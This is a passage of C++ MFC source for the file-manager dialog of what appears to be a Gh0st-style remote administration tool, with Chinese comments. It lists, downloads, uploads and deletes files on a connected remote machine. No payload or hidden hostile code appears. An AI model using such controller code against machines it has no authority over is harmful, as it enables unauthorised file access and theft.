	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, PacketSize);

	bPacket[0] = COMMAND_LIST_FILES;
	memcpy(bPacket + 1, m_Remote_Path.GetBuffer(0), PacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, PacketSize,TRUE);
	LocalFree(bPacket);

	m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);
	m_Remote_Directory_ComboBox.SetCurSel(0);
	
	// 得到返回数据前禁窗口
	m_list_remote.EnableWindow(FALSE);
//	m_ProgressCtrl->SetPos(0);
	
	DRIVE_CAZ = FALSE;
}

void CFileManagerDlg::OnDblclkListRemote(NMHDR* pNMHDR, LRESULT* pResult)
{
	if (m_list_remote.GetSelectedCount() == 0 || m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) != 1)
		return;
	// TODO: Add your control notification handler code here
	GetRemoteFileList();
	*pResult = 0;
}

void CFileManagerDlg::FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen)
{
	// 重新设置ImageList
	SHFILEINFO	sfi;
	HIMAGELIST hImageListLarge = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_LARGEICON);
	HIMAGELIST hImageListSmall = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);

	// 重建标题
	m_list_remote.DeleteAllItems();
	while(m_list_remote.DeleteColumn(0) != 0);
	m_list_remote.InsertColumn(0, "名称",  LVCFMT_LEFT, 225);
	m_list_remote.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, "类型", LVCFMT_LEFT, 125);
	m_list_remote.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);

	int	nItemIndex = 0;
	m_list_remote.SetItemData
		(
		m_list_remote.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
		1
		);
	/*
	ListView 消除闪烁
	更新数据前用SetRedraw(FALSE)   
	更新后调用SetRedraw(TRUE)
	*/
	m_list_remote.SetRedraw(FALSE);

	if (dwBufferLen != 0)
	{
		// 
		for (int i = 0; i < 2; i++)
		{
			// 跳过Token，共5字节
			char *pList = (char *)(pbBuffer + 1);			
			for(char *pBase = pList; (unsigned long)(pList - pBase) < dwBufferLen - 1;)
			{
				char	*pszFileName = NULL;
				DWORD	dwFileSizeHigh = 0; // 文件高字节大小
				DWORD	dwFileSizeLow = 0; // 文件低字节大小
				int		nItem = 0;
				bool	bIsInsert = false;
				FILETIME	ftm_strReceiveLocalFileTime;

				int	nType = *pList ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
				// i 为 0 时，列目录，i为1时列文件
				bIsInsert = !(nType == FILE_ATTRIBUTE_DIRECTORY) == i;
				pszFileName = ++pList;

				if (bIsInsert)
				{
					nItem = m_list_remote.InsertItem(nItemIndex++, pszFileName, GetIconIndex(pszFileName, nType));
					m_list_remote.SetItemData(nItem, nType == FILE_ATTRIBUTE_DIRECTORY);
					SHFILEINFO	sfi;
					SHGetFileInfo(pszFileName, FILE_ATTRIBUTE_NORMAL | nType, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);   
					m_list_remote.SetItemText(nItem, 2, sfi.szTypeName);
				}

				// 得到文件大小
				pList += lstrlen(pszFileName) + 1;
				if (bIsInsert)
				{
					CString strFileSize;
					memcpy(&dwFileSizeHigh, pList, 4);
					memcpy(&dwFileSizeLow, pList + 4, 4);
					__int64 nFileSize = ((__int64)dwFileSizeHigh << 32) + dwFileSizeLow;
					if (nFileSize >= 1024 * 1024 * 1024)
						strFileSize.Format("%10.2f GB", (double)nFileSize / (1024 * 1024 * 1024));
					else if (nFileSize >= 1024 * 1024)
						strFileSize.Format("%10.2f MB", (double)nFileSize / (1024 * 1024));
					else
						strFileSize.Format("%10I64u KB", nFileSize / 1024 + (nFileSize % 1024 ? 1 : 0));
					m_list_remote.SetItemText(nItem, 1, strFileSize);
					memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
					CTime	time(ftm_strReceiveLocalFileTime);
					m_list_remote.SetItemText(nItem, 3, time.Format("%Y-%m-%d %H:%M"));	
				}
				pList += 16;
			}
		}
	}

	m_list_remote.SetRedraw(TRUE);
	// 恢复窗口
	m_list_remote.EnableWindow(TRUE);

	if(DRIVE_CAZ == FALSE)
	{
		DWORD_PTR dwResult;
		ShowMessage("远程目录：%s", m_Remote_Path);
		SendMessageTimeout(m_ProgressCtrl->GetSafeHwnd(), PBM_SETPOS, 0, 0, SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);
		SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2, NULL, SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);
	}
}

void CFileManagerDlg::ShowMessage(char *lpFmt, ...)
{
	char buff[1024];
    va_list    arglist;
    va_start( arglist, lpFmt );
	
	memset(buff, 0, sizeof(buff));
	
	vsprintf(buff, lpFmt, arglist); DWORD_PTR dwResult;
	SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 0, (LPARAM)buff, SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);
    va_end( arglist );
}

void CFileManagerDlg::OnRemotePrev()
{
	// TODO: Add your command handler code here
	GetRemoteFileList("..");
}

void CFileManagerDlg::OnRemoteHome()
{
	// TODO: Add your command handler code here
	FixedRemoteDriveList();
}

// void CFileManagerDlg::OnLocalView() 
// {
// 	// TODO: Add your command handler code here
// 	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
// }

// 在工具栏上显示ToolTip
BOOL CFileManagerDlg::OnToolTipNotify(UINT id, NMHDR* pNMHDR, LRESULT* pResult)
{
	ASSERT(pNMHDR->code == TTN_NEEDTEXTA || pNMHDR->code == TTN_NEEDTEXTW);
	//让上一层的边框窗口优先处理该消息
	if (GetRoutingFrame() != NULL)
	return FALSE;

	//分ANSI and UNICODE两个处理版本
	TOOLTIPTEXTA* pTTTA = (TOOLTIPTEXTA*)pNMHDR;
	TOOLTIPTEXTW* pTTTW = (TOOLTIPTEXTW*)pNMHDR;
	TCHAR szFullText[256];

	CString strTipText;
	UINT nID = pNMHDR->idFrom;

	//如果idFrom是一个子窗口，则得到其ID。

	if (
		pNMHDR->code == TTN_NEEDTEXTA 
		&& (pTTTA->uFlags & TTF_IDISHWND) 
		|| pNMHDR->code == TTN_NEEDTEXTW 
		&& (pTTTW->uFlags & TTF_IDISHWND)
		)
	{
		//idFrom是工具条的句柄	
		nID = ::GetDlgCtrlID((HWND)nID);
	}

	if (nID != 0) //若是0，为一分隔栏，不是按钮
	{
		//得到nID对应的字符串
		AfxLoadString(nID, szFullText);
		//从上面得到的字符串中取出Tooltip使用的文本
		AfxExtractSubString(strTipText, szFullText, 1, '\n');	
	}

	//复制分离出的文本
	#ifndef _UNICODE
	if (pNMHDR->code == TTN_NEEDTEXTA)
	lstrcpyn(pTTTA->szText, strTipText, sizeof(pTTTA->szText));
	else
	_mbstowcsz(pTTTW->szText, strTipText, sizeof(pTTTW->szText));
	#else
	if (pNMHDR->code == TTN_NEEDTEXTA)
	_wcstombsz(pTTTA->szText, strTipText, sizeof(pTTTA->szText));
	else
	lstrcpyn(pTTTW->szText, strTipText, sizeof(pTTTW->szText));
	#endif
	*pResult = 0;
	//显示Tooltip窗口
	::SetWindowPos(pNMHDR->hwndFrom, HWND_TOP, 0, 0, 0, 0, SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
	return TRUE; //消息处理完毕
}

//////////////////////////////////以下为工具栏响应处理//////////////////////////////////////////
void CFileManagerDlg::OnLocalList()
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_LIST);	
}

void CFileManagerDlg::OnLocalReport()
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);	
}

void CFileManagerDlg::OnLocalBigicon()
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_ICON);	
}

void CFileManagerDlg::OnLocalSmallicon()
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);	
}

void CFileManagerDlg::OnRemoteList()
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_LIST);	
}

void CFileManagerDlg::OnRemoteReport()
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);	
}

void CFileManagerDlg::OnRemoteBigicon()
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_ICON);	
}

void CFileManagerDlg::OnRemoteSmallicon()
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);	
}

void CFileManagerDlg::OnRemoteView()
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);
}

void CFileManagerDlg::OnRemoteDesktop()
{
	m_Remote_Directory_ComboBox.SetWindowText(m_strDesktopPath);
	m_list_remote.SetSelectionMark(-1);
	GetRemoteFileList();
}

void CFileManagerDlg::OnUpdateRemotePrev(CCmdUI* pCmdUI)      //向上
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteHome(CCmdUI* pCmdUI)      //主页
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteStop(CCmdUI* pCmdUI)      //取消
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(!m_list_remote.IsWindowEnabled() && !m_bIsStop);
}

void CFileManagerDlg::OnUpdateRemoteNewfolder(CCmdUI* pCmdUI) //新建
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteDelete(CCmdUI* pCmdUI)    //删除
{
	// TODO: Add your command update UI handler code here
	// 不是根目录，并且选择项目大于0
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.GetSelectedCount() && m_list_remote.IsWindowEnabled());		
}

void CFileManagerDlg::OnUpdateRemoteSend(CCmdUI* pCmdUI)      //上传
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteRecv(CCmdUI* pCmdUI)      //下载
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteRefresh(CCmdUI* pCmdUI)   //刷新
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteDesktop(CCmdUI* pCmdUI)   //桌面
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_list_remote.IsWindowEnabled());
}

bool CFileManagerDlg::FixedUploadDirectory(LPCTSTR lpPathName)
{
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
	
	wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);
	
	WIN32_FIND_DATA	wfd;
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;
	
	do
	{
		if (wfd.cFileName[0] == '.') 
			continue; // 过滤这两个目录 
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
		{
			char strDirectory[MAX_PATH];
			wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName); 
			FixedUploadDirectory(strDirectory); // 如果找到的是目录，则进入此目录进行递归 
		}
		else 
		{
			CString file;
			file.Format("%s%s%s", lpPathName, lpszSlash, wfd.cFileName); 
			m_Remote_Upload_Job.AddTail(file);
			// 对文件进行操作 
		} 
	} while (FindNextFile(hFind, &wfd)); 
	FindClose(hFind); // 关闭查找句柄
	return true;
}

void CFileManagerDlg::EnableControl(BOOL bEnable)
{
// 	m_list_local.EnableWindow(bEnable);
// 	m_Local_Directory_ComboBox.EnableWindow(bEnable);
	m_list_remote.EnableWindow(bEnable);
	m_Remote_Directory_ComboBox.EnableWindow(bEnable);
}

CString CFileManagerDlg::ExtractNameFromFullPath(CString szFullPath)
{ 
	char path_buffer[_MAX_PATH];
	char fname[_MAX_FNAME]; 
	char ext[_MAX_EXT]; 
	strcpy(path_buffer,szFullPath); 
	_splitpath( path_buffer, NULL, NULL, fname, ext); 
	
	return CString(fname) + CString(ext); 
}

void CFileManagerDlg::OnLocalCopy()
{
	m_bIsUpload = true;
	// 重置上传任务列表
	m_Remote_Upload_Job.RemoveAll();
	CString	file = GetDirectoryPath(TRUE);
	if (file == "") return;
	
	m_Local_Path = file.Left(file.ReverseFind('\\') + 1);
	if (GetFileAttributes(file) & FILE_ATTRIBUTE_DIRECTORY)
	{
		if (file.GetAt(file.GetLength() - 1) != '\\')
			file += "\\";
		FixedUploadDirectory(file.GetBuffer(0));
	}
	else
	{
		m_Remote_Upload_Job.AddTail(file);
	}
	
	if (m_Remote_Upload_Job.IsEmpty())
	{
		::MessageBox(m_hWnd, "文件夹为空", "警告", MB_OK|MB_ICONWARNING);
		return;
	}
	EnableControl(FALSE);
	SendUploadJob();
}

// 获取选择的路径
CString  CFileManagerDlg::GetDirectoryPath(BOOL bIncludeFiles)
{
	char szPath[MAX_PATH]; //用来存储路径的字符串
	GetModuleFileName(NULL, szPath, MAX_PATH);
	CString strPath = szPath;
	BROWSEINFO bInfo;
	ZeroMemory(&bInfo, sizeof(bInfo));
	bInfo.hwndOwner = m_hWnd;
	bInfo.lParam    = (LPARAM)strPath.GetBuffer(strPath.GetLength());
	if (bIncludeFiles)
	{
		bInfo.lpszTitle = "请选择上传路径: ";
		bInfo.ulFlags   = BIF_BROWSEINCLUDEFILES|0x40;
	}
	else
	{
		bInfo.lpszTitle = "请选择下载路径: ";
		bInfo.ulFlags   = BIF_RETURNONLYFSDIRS|0x40;
	}
	
	strPath = "";         //先清空返回的路径
	LPITEMIDLIST lpDlist; //用来保存返回信息的IDList
	lpDlist = SHBrowseForFolder(&bInfo) ; //显示选择对话框
	if(lpDlist != NULL)   //用户按了确定按钮
	{
		SHGetPathFromIDList(lpDlist, szPath);//把项目标识列表转化成字符串
		strPath.Format("%s", szPath); //将TCHAR类型的字符串转换为CString类型的字符串
	}
	return strPath;
}

//////////////// 文件传输操作 ////////////////
// 只管发出了下载的文件
// 一个一个发，接收到下载完成时，下载第二个文件 ...
void CFileManagerDlg::OnRemoteCopy()
{
	m_bIsUpload = false;
	// 禁用文件管理窗口
	EnableControl(FALSE);

	// TODO: Add your command handler code here
	// 如果Drag的，找到Drop到了哪个文件夹
	if (m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
		m_hCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);
	// 重置下载任务列表
	CString	file;
	m_Remote_Download_Job.RemoveAll();
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition();
	while(pos)
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
		// 如果是目录
		if (m_list_remote.GetItemData(nItem))
			file += '\\';
		m_Remote_Download_Job.AddTail(file);
	}

	if (file.IsEmpty())
	{
		EnableControl(TRUE);
		::MessageBox(m_hWnd, "请选择文件！", "警告", MB_OK|MB_ICONWARNING);
		return ;
	}

	strLpath = GetDirectoryPath(FALSE);
	if (strLpath == "")
	{
		EnableControl(TRUE);
		//::MessageBox(m_hWnd, "Path Error！", "警告", MB_OK|MB_ICONWARNING);
		return;
	}
	if (strLpath.GetAt(strLpath.GetLength() - 1) != '\\')
		strLpath += "\\";
	m_nTransferMode = TRANSFER_MODE_NORMAL;

	// 发送第一个下载任务
	SendDownloadJob();
}

// 发出一个下载任务
BOOL CFileManagerDlg::SendDownloadJob()
{
	if (m_Remote_Download_Job.IsEmpty())
		return FALSE;
	
    EnableControl(FALSE);
	// 发出第一个下载任务命令
	CString file = m_Remote_Download_Job.GetHead();
	int		nPacketSize = file.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
 	bPacket[0] = COMMAND_DOWN_FILES;
	
 	// 文件偏移，续传时用
 	memcpy(bPacket + 1, file.GetBuffer(0), file.GetLength() + 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize,TRUE);
	LocalFree(bPacket);
	
	// 从下载任务列表中删除自己
	m_Remote_Download_Job.RemoveHead();
	
	return TRUE;
}

// 发出一个上传任务
BOOL CFileManagerDlg::SendUploadJob()
{
	if (m_Remote_Upload_Job.IsEmpty())
		return FALSE;
	
    EnableControl(FALSE);
	CString	strDestDirectory = m_Remote_Path;
	// 如果远程也有选择，当做目标文件夹
	int nItem = m_list_remote.GetSelectionMark();
	
	// 是文件夹
// 	if (nItem != -1 && m_list_remote.GetItemData(nItem) == 1)
// 	{
// 		strDestDirectory += m_list_remote.GetItemText(nItem, 0) + "\\";
// 	}
	
	if (!m_hCopyDestFolder.IsEmpty())
	{
		strDestDirectory += m_hCopyDestFolder + "\\";
	}
	
	if (strDestDirectory.IsEmpty())
	{
		m_Local_Path = "";
		m_Remote_Upload_Job.RemoveHead();
		EnableControl(TRUE);
		::MessageBox(m_hWnd, "请选择目录！", "警告", MB_OK|MB_ICONWARNING);
		return 0;
	}
	
	// 发出第一个下载任务命令
	m_strOperatingFile = m_Remote_Upload_Job.GetHead();
	
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	CString	fileRemote = m_strOperatingFile; // 远程文件
	
	// 得到要保存到的远程的文件路径
	fileRemote.Replace(m_Local_Path, strDestDirectory);
	m_strFileName = m_strUploadRemoteFile = fileRemote;
	
	if (m_hFileSend != INVALID_HANDLE_VALUE)
		CloseHandle(m_hFileSend);
	m_hFileSend = CreateFile(m_strOperatingFile.GetBuffer(0),
		GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (m_hFileSend == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize (m_hFileSend, &dwSizeHigh);
	m_nOperatingFileLength = ((__int64)dwSizeHigh << 32) + dwSizeLow;
	//CloseHandle(m_hFileSend); // 此处不要关闭, 以后还要用
	
	// 构造数据包，发送文件长度(1字节token, 8字节大小, 文件名称, '\0')
	int		nPacketSize = fileRemote.GetLength() + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = COMMAND_FILE_SIZE;
	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
	memcpy(bPacket + 9, fileRemote.GetBuffer(0), fileRemote.GetLength() + 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize,TRUE);
	LocalFree(bPacket);
	
	// 从下载任务列表中删除自己
	m_Remote_Upload_Job.RemoveHead();
	return TRUE;
}

// 发出一个删除任务
BOOL CFileManagerDlg::SendDeleteJob()
{
	if (m_Remote_Delete_Job.IsEmpty())
		return FALSE;
	
	EnableControl(FALSE);
	// 发出第一个下载任务命令
	CString file = m_Remote_Delete_Job.GetHead();
	int		nPacketSize = file.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	
	m_strFileName = file;
	if (file.GetAt(file.GetLength() - 1) == '\\')
		bPacket[0] = COMMAND_DELETE_DIRECTORY;
	else
		bPacket[0] = COMMAND_DELETE_FILE;
	
	// 文件偏移，续传时用
	memcpy(bPacket + 1, file.GetBuffer(0), nPacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize,TRUE);
	LocalFree(bPacket);
	
	// 从下载任务列表中删除自己
	m_Remote_Delete_Job.RemoveHead();
	
	DRIVE_CAZ = TRUE;
	return TRUE;
}

void CFileManagerDlg::CreateLocalRecvFile()
{
	// 重置计数器
	m_nCounter = 0;

	FILESIZE	*pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwSizeHigh = pFileSize->dwSizeHigh;
	DWORD	dwSizeLow = pFileSize->dwSizeLow;

	m_nOperatingFileLength = ((__int64)dwSizeHigh << 32) + dwSizeLow;

	// 当前正操作的文件名
	m_strOperatingFile = m_pContext->m_DeCompressionBuffer.GetBuffer(9);

/*
	//获取文件下载保存路径
	TCHAR szSaveFile[MAX_PATH];
	strcpy(szSaveFile, ExtractNameFromFullPath(m_strOperatingFile));//填充默认文件名
	//AfxMessageBox(szSaveFile);

	OPENFILENAME ofn;
	ZeroMemory(&ofn,sizeof(ofn));
	ofn.lStructSize = sizeof(ofn);
	ofn.hwndOwner = GetSafeHwnd();
	ofn.lpstrFile = szSaveFile;
	ofn.nMaxFile = sizeof(szSaveFile);
	ofn.lpstrFilter = _T("下载文件(*.*)\0*.*\0\0");
	ofn.nFilterIndex = 1;
	ofn.lpstrFileTitle = NULL;
	ofn.nMaxFileTitle = 0;
	ofn.lpstrInitialDir = NULL;
	ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_OVERWRITEPROMPT;
	if (!GetSaveFileName(&ofn))
	{
		EnableControl(TRUE);
		return ;
	}
   
	m_strReceiveLocalFile=szSaveFile;
	*/

	m_strReceiveLocalFile = m_strOperatingFile;
	
	// 得到要保存到的本地的文件路径
	m_strReceiveLocalFile.Replace(m_Remote_Path, strLpath);
	m_strFileName = m_strReceiveLocalFile;

	// 创建多层目录
	MakeSureDirectoryPathExists(m_strReceiveLocalFile.GetBuffer(0));
 
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strReceiveLocalFile.GetBuffer(0), &FindFileData);

	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		CFileTransferModeDlg	dlg(this);
		dlg.m_strFileName = m_strReceiveLocalFile;
		switch (dlg.DoModal())
		{
		case IDC_OVERWRITE:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE;
			break;
		case IDC_OVERWRITE_ALL:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
			break;
		case IDC_ADDITION:
			m_nTransferMode = TRANSFER_MODE_ADDITION;
			break;
		case IDC_ADDITION_ALL:
			m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
			break;
		case IDC_JUMP:
			m_nTransferMode = TRANSFER_MODE_JUMP;
			break;
		case IDC_JUMP_ALL:
			m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
			break;
		case IDC_CANCEL:
			m_nTransferMode = TRANSFER_MODE_CANCEL;
			break;
		}
	}

	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		// 取消传送
		m_bIsStop = true;
		SendStop(TRUE);
		FindClose(hFind);
		return;
	}

	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}

	//  1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打开方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = COMMAND_CONTINUE;

	// 文件已经存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// 提示点什么
		// 如果是续传
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			// 接收的长度递增
			m_nCounter += (__int64)FindFileData.nFileSizeHigh << 32;
			m_nCounter += FindFileData.nFileSizeLow;

			dwCreationDisposition = OPEN_EXISTING;
		}
		// 覆盖
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// 偏移置0
			memset(bToken + 1, 0, 8);
			// 重新创建
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// 跳过，指针移到-1
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 1, &dwOffset, 4);
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
			DWORD_PTR dwResult;
			SendMessageTimeout(m_ProgressCtrl->GetSafeHwnd(), PBM_SETPOS, 100, 0, SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);
		}
	}
	else
	{
		// 偏移置0
		memset(bToken + 1, 0, 8);
		// 重新创建
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);

	if (m_hFileRecv != INVALID_HANDLE_VALUE)
		CloseHandle(m_hFileRecv);
	m_hFileRecv = CreateFile(m_strReceiveLocalFile.GetBuffer(0),
		GENERIC_WRITE, 0, NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, 0);
	// 需要错误处理
	if (m_hFileRecv == INVALID_HANDLE_VALUE)
	{
		m_nOperatingFileLength = 0;
		m_nCounter = 0;
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " 文件创建失败", "警告", MB_OK|MB_ICONWARNING);
		return;
	}
	//CloseHandle(m_hFileRecv); // 此处不要关闭, 以后还要用

	ShowProgress();
	if (m_bIsStop)
		SendStop(TRUE);
	else
	{
		// 发送继续传输文件的token,包含文件续传的偏移
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken),TRUE);
	}
}

// 写入文件内容
void CFileManagerDlg::WriteLocalRecvFile()
{
	// 传输完毕
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite=0;
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILESIZE	*pFileSize;
	// 得到数据的偏移
	pData = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
	
	pFileSize = (FILESIZE *)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	// 得到数据在文件中的偏移, 赋值给计数器
	//m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);
	
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;
	// 得到数据在文件中的偏移, 赋值给计数器
	m_nCounter = MAKEINT64(dwOffsetLow, dwOffsetHigh);
	
	if(m_nCounter < 0)   //数据出错 返回上传传送数据
	{
		m_nCounter = Bf_nCounters;
		dwOffsetHigh = Bf_dwOffsetHighs;
		dwOffsetLow = Bf_dwOffsetLows;
	}
	else
	{
		Bf_nCounters = m_nCounter;
		Bf_dwOffsetHighs = dwOffsetHigh;
		Bf_dwOffsetLows = dwOffsetLow;
		
		dwBytesToWrite = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;
		
		SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
		
		BOOL bResult = FALSE;
		for (int i = 0; i < MAX_WRITE_RETRY; i++)
		{
			// 写入文件
			bResult = WriteFile(m_hFileRecv, pData, dwBytesToWrite, &dwBytesWrite, NULL);
			if (bResult)
				break;
		}
		if (i == MAX_WRITE_RETRY && !bResult)
		{
			::MessageBox(m_hWnd, m_strReceiveLocalFile + " 文件写入失败", "警告", MB_OK|MB_ICONWARNING);
		}
		dwOffsetLow = 0; dwOffsetHigh = 0;
		dwOffsetLow = SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_CURRENT);
		//CloseHandle(m_hFileRecv); // 此处不要关闭, 以后还要用
		// 为了比较，计数器递增
		m_nCounter += dwBytesWrite;
		ShowProgress();
	}
	if (m_bIsStop)
		SendStop(TRUE);
	else
	{
		BYTE	bToken[9];
		bToken[0] = COMMAND_CONTINUE;
		memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
		memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken),TRUE);
	}
}

void CFileManagerDlg::EndLocalRecvFile()
{
//	m_bIsStop = false;
//	EnableControl(TRUE);
	
	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;
	
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}
	
	if (m_Remote_Download_Job.IsEmpty() || m_bIsStop)
	{
